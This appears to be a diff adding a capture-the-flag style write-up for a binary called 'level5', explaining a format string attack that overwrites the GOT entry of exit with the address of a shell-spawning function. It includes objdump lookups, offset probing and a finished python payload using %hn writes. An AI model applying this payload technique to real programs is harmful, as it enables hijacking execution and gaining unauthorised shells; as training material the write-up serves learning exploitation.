@@ -1,0 +1,42 @@
+This one is a bit more complicated
+
+We find everything but there is no condition to match, we look for hidden things
+and find the o function which gives us a shell. Well ,how to access it ?
+
+Overriding the main return address with the address of o ? We cant, there is an
+exit at the end of n.
+
+Let's override the address of exit !
+
+ok first we need the address of exit :
+
+objdump -R level5
+
+08049838 R_386_JUMP_SLOT   exit
+
+now the address of o
+
+objdump -t level5
+
+080484a4 g     F .text	0000001e              o
+
+Lets find the offset, as usual
+
+python -c 'print "AAAA" + "%x" *10'
+
+oh its on the fourth one
+
+we write our address in 2 times by splitting it :
+
+0x08049838 will take 84a4
+0x0804983a (previous +2) will take 0804
+
+so 0804 = 2052
+   84a4 = 33956
+
+2052 - 4 *2 ( the addressess) = 2044
+33956 - 2052 = 31904
+
+so our exploit will look like :
+
+python -c 'print "\x3a\x98\x04\x08" + "\x38\x98\x04\x08" + "%2044x%4$hn%31904x%5$hn"'
